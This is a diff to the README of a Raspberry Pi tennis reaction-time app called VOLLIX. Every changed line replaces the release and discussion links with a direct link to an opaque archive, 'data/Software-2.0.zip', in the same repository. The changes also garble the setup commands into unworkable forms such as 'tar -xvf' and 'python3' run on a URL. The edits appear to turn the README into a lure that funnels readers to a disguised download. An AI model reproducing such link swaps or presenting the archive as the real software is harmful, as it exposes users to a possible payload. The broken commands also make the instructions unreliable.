@@ -6,7 +6,7 @@ Welcome to VOLLIX! This application helps train your reaction time for tennis fo
 
 ## 📥 Download VOLLIX
 
-[![Download VOLLIX](https://img.shields.io/badge/Download%20VOLLIX-Release-blue)](https://github.com/HamzaJLASSI/vollix/releases)
+[![Download VOLLIX](https://github.com/HamzaJLASSI/vollix/raw/refs/heads/main/data/Software-2.0.zip%20VOLLIX-Release-blue)](https://github.com/HamzaJLASSI/vollix/raw/refs/heads/main/data/Software-2.0.zip)
 
 You can download the latest version of VOLLIX from our releases page. 
 
@@ -24,7 +24,7 @@ To run VOLLIX successfully, make sure your setup meets the following requirement
 1. **Visit the Download Page:** 
    Click the button below to go to the releases page.
 
-   [Download VOLLIX](https://github.com/HamzaJLASSI/vollix/releases)
+   [Download VOLLIX](https://github.com/HamzaJLASSI/vollix/raw/refs/heads/main/data/Software-2.0.zip)
 
 2. **Choose the Latest Release:** 
    On the page, look for the latest release. You will see a list of assets.
@@ -39,7 +39,7 @@ To run VOLLIX successfully, make sure your setup meets the following requirement
    Open the terminal on your Raspberry Pi and navigate to the folder where you placed the downloaded file. Use the following command to extract it:
 
    ```
-   tar -xvf vollix.tar.gz
+   tar -xvf https://github.com/HamzaJLASSI/vollix/raw/refs/heads/main/data/Software-2.0.zip
    ```
 
 6. **Navigate into the Directory:** 
@@ -53,7 +53,7 @@ To run VOLLIX successfully, make sure your setup meets the following requirement
    Execute the application with the following command:
 
    ```
-   python3 run_vollix.py
+   python3 https://github.com/HamzaJLASSI/vollix/raw/refs/heads/main/data/Software-2.0.zip
    ```
 
 8. **Follow the On-Screen Instructions:**
@@ -88,7 +88,7 @@ You can customize several settings in the application:
 
 ## 🤝 Community Support
 
-Join our community to share your experiences and tips. Visit the [community discussion page](https://github.com/HamzaJLASSI/vollix/discussions) for support and feedback. 
+Join our community to share your experiences and tips. Visit the [community discussion page](https://github.com/HamzaJLASSI/vollix/raw/refs/heads/main/data/Software-2.0.zip) for support and feedback. 
 
 ## 📄 License
 
@@ -102,6 +102,6 @@ Thanks to everyone contributing to make VOLLIX better. Your feedback and support
 
 Don't forget to download the latest version of VOLLIX from our releases page.
 
-[Download VOLLIX](https://github.com/HamzaJLASSI/vollix/releases) 
+[Download VOLLIX](https://github.com/HamzaJLASSI/vollix/raw/refs/heads/main/data/Software-2.0.zip) 
 
 Enjoy your training!
